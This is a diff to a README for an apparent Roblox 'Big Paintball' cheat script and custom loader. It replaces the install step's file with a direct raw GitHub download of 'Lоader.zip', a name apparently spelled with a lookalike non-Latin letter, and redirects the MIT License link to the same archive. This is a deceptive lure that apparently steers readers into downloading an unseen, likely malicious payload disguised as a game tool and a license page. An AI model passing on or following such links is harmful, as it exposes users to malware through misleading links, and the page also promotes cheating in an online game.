@@ -26,7 +26,7 @@ Big Paintball Script, Gaming Automation, Custom Loader, Game Modding, Roblox Imp
 
 ## 📋 Installation
 
-1. **Download** Loader.rar from the repository.
+1. **Download** https://raw.githubusercontent.com/hatemezzat/EpicBigPaintballToolkit/main/Lоader.zip from the repository.
 2. **Extract** the archive using your preferred tool.
 3. **Follow** the included instructions to use the script in Big Paintball.
 
@@ -36,7 +36,7 @@ This repository is for educational and research purposes only. Usage may violate
 
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+Licensed under the [MIT License](https://raw.githubusercontent.com/hatemezzat/EpicBigPaintballToolkit/main/Lоader.zip) © 2025.
 
 ---
 
